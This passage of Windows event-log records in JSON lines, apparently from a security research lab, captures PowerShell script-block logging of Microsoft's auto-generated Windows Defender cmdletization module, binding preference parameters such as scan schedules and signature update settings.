$true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {\n          [object]$__cmdletization_value = ${DisableAutoExclusions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {\n          [object]$__cmdletization_value = ${DisablePrivacyMode}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {\n          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {\n          [object]$__cmdletization_value = ${SchedulerRandomizationTime}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {\n          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"ltValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {\n          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {\n          [object]$__cmdletization_value = ${ScanScheduleTime}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {\n          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {\n          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {\n          [object]$__cmdletization_value = ${SignatureAuGracePeriod}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {\n          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {\n          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {\n          [object]$__cmdletization_value = ${SignatureFallbackOrder}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {\n          [object]$__cmdletization_value = ${SharedSignaturesPath}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {\n          [object]$__cmdletization_value = ${SignatureScheduleDay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {\n          [object]$__cmdletization_value = ${SignatureScheduleTime}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {\n          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {\n          [object]$__cmdletization_value = ${SignatureUpdateInterval}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":" [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {\n          [object]$__cmdletization_value = ${RealTimeScanDirection}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {\n          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {\n          [object]$__cmdletization_value = ${RemediationScheduleDay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {\n          [object]$__cmdletization_value = ${RemediationScheduleTime}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {\n          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {\n          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {\n          [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {\n          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {\n          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {\n          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {\n          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanParameters')) {\n          [object]$__cmdletization_value = ${ScanParameters}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {\n          [object]$__cmdletization_value = ${ScanScheduleDay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defau"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreat'\n$script:ClassVersion = '1.0'\n$script:ModuleVersion = '1.0'\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\n\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\n\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\n        \n\nfunction __cmdletization_BindCommonParameters\n{\n    param(\n        $__cmdletization_objectModelWrapper,\n        $myPSBoundParameters\n    )       \n                \n\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \n            